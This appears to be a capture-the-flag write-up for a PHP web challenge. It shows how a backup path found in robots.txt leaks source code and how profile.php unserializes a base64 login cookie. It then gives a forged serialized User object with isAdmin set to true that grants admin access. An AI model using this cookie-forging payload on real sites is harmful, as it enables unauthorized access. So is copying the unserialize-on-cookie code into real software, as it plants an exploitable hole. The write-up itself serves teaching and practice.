---
title: "Web: Hidden In Plain Sight"
date: "2024-06-27"
tags:
    - insecure deserialization
thumbnail: "/assets/img/thumbnail/icmtc24.png"
---


# Solution
---
when we start we see a simple login page
<img src="/assets/img/icmtc24/capture.png">

When i go to `/robots.txt` i found this
```
User-agent: *
Disallow: /s3cr3t_b4ckup
```

when you go to `/s3cr3t_b4ckup` you will be able to download the source code

the code `config.php` whose content is
```php
<?php
$valid_username = 'guest';
$valid_password = 'guest@123456';
?>
```

This is very good i used this credential to login
we have also `login.php` which contains
```php
<?php

include("config.php");

class User {
    public $username;
    private $password;

    public function __construct($username, $password) {
        $this->username = $username;
        $this->password = $password;
    }

}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];


    if ($username === $valid_username && $password === $valid_password) {
        $user= new User($username, $password);
        $cookie_value = base64_encode(serialize($user));
        setcookie('login', $cookie_value, time() + 3600, '/');
        header('Location: profile.php');
        exit();
    } else {
        $error_message = 'Invalid username or password.';
    }
}
?>
```

The interesting info here that the cookie is formed by calculating base64 of the serialized object of the logged in user.
so if we decode out current cookie it becomes `O:4:"User":2:{s:8:"username";s:5:"guest";s:14:"Userpassword";s:12:"guest@123456";}`
It's corresponding to a user object with the credential we used.
for more understanding of how the php serialized object created <a href="https://www.php.net/manual/en/function.serialize.php">here</a>

in the src code there's also `profile.php` which contains
```php
<?php
include("flag.php");
include("config.php");
include("user.php");

if (isset($_COOKIE['login'])) {
    $user = unserialize(base64_decode($_COOKIE['login']));
         if ($user instanceof User) {
        if ($user->is_admin()) {
            $welcome_message= "Welcome, admin! <br> $flag";
        } else {
            $welcome_message= 'Hello, ' . htmlspecialchars($user->username);
        }
    }
else {
    header('Location: index.php');
    exit(); 
}
}
else {
    header('Location: index.php');
    exit(); 
}
?>
```

from this code we see that the flag will appear if the logged in user is instance of user and `is_admin()` returns True
This function is tested on the cookie after decoding and unserializing the cookie (returning it to object).

The last file in src code is `user.php` whose content is
```php
<?php
class User {
    public $username;
    private $isAdmin = false;
    private $password;

    public function __construct($username, $password) {
        $this->username = $username;
        $this->password = $password;
    }
    public function getPassword() {
        return $this->password;
    }
       public function getUsername() {
        return $this->username;
    }
    public function is_admin() {
        return $this->isAdmin;
    }
}
?>
```
we see that `is_admin()` returns True if `isAdmin` attribute equals True.

So our idea here is updating the cookie by adding `isAdmin` attribute and setting it to True.
Note the validation to render the flag is done in `isAdmin` only, so we don't need the username, etc ... (including them isn't a problem but i will ignore them xD)
So the serialized object here became `O:4:"User":1:{s:7:"isAdmin";b:1;}`

digging the serialized object
```
O: object
4: object name length (needed for parsing)
User: object name
1: number of object attributes
s: string
7: string's name length
isAdmin: string's name
b: boolean
1: true
```


encode it and add it in the browser cookie or burp and you will get the flag
<img src="/assets/img/icmtc24/capture1.png">
Congratzzzz